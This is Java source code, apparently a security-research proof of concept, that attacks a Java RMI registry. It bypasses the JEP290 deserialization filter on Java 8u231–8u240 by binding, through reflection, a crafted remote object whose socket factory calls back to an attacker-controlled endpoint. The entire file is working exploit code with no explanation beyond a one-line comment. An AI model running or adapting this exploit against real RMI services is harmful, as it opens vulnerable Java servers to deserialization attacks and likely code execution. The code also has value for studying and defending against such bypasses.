package RMI;

import sun.rmi.registry.RegistryImpl_Stub;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.*;
import java.util.Random;

// 绕过JEP290(8u231~8u240)
public class ServerBypassJEP290 {
    public static void main(String[] args) throws Exception {
        UnicastRemoteObject payload = getPayload();
        java.rmi.registry.Registry registry = LocateRegistry.getRegistry(1099);
        bindReflection("pwn", payload, registry);
    }

    static UnicastRemoteObject getPayload() throws Exception {
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint te = new TCPEndpoint("localhost", 13999);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));

        System.getProperties().put("sun.misc.ProxyGenerator.saveGeneratedFiles", "true");
        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler(ref);
        RMIServerSocketFactory factory = (RMIServerSocketFactory) Proxy.newProxyInstance(
                handler.getClass().getClassLoader(),
                new Class[]{RMIServerSocketFactory.class, Remote.class},
                handler
        );

        Constructor<UnicastRemoteObject> constructor = UnicastRemoteObject.class.getDeclaredConstructor();
        constructor.setAccessible(true);
        UnicastRemoteObject unicastRemoteObject = constructor.newInstance();

        Field field_ssf = UnicastRemoteObject.class.getDeclaredField("ssf");
        field_ssf.setAccessible(true);
        field_ssf.set(unicastRemoteObject, factory);

        return unicastRemoteObject;
    }

    static void bindReflection(String name, Object obj, Registry registry) throws Exception {
        Field ref_filed = RemoteObject.class.getDeclaredField("ref");
        ref_filed.setAccessible(true);
        UnicastRef ref = (UnicastRef) ref_filed.get(registry);

        Field operations_filed = RegistryImpl_Stub.class.getDeclaredField("operations");
        operations_filed.setAccessible(true);
        Operation[] operations = (Operation[]) operations_filed.get(registry);

        RemoteCall remoteCall = ref.newCall((RemoteObject) registry, operations, 0, 4905912898345647071L);
        ObjectOutput outputStream = remoteCall.getOutputStream();

        Field enableReplace_filed = ObjectOutputStream.class.getDeclaredField("enableReplace");
        enableReplace_filed.setAccessible(true);
        enableReplace_filed.setBoolean(outputStream, false);

        outputStream.writeObject(name);
        outputStream.writeObject(obj);

        ref.invoke(remoteCall);
        ref.done(remoteCall);
    }
}
